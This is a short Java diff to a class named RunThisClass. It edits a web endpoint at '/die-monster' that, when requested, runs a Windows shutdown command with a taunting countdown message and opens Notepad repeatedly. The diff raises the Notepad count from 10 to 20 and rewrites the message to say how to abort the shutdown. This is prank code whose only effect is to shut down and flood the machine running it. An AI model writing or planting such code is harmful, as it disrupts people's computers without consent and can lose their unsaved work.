@@ -12,9 +12,9 @@ public class RunThisClass {
     @GET
     @Path("/die-monster")
     public Response die() throws IOException {
-        Runtime.getRuntime().exec("shutdown -s -t 130 /c \"I WARNED YOU! YOU HAVE 60 SECONDS TO DO SOMETHING!!\"");
+        Runtime.getRuntime().exec("shutdown -s -t 130 /c \"I WARNED YOU! YOU HAVE 1:30 MIN TO OPEN CMD AND TYPE 'shutdown /a', OTHERWISE, YOUR PC WILL TURN OFF!!\"");
 
-        for (int i = 0; i < 10; i++) {
+        for (int i = 0; i < 20; i++) {
             Runtime.getRuntime().exec("notepad.exe");
         }
 
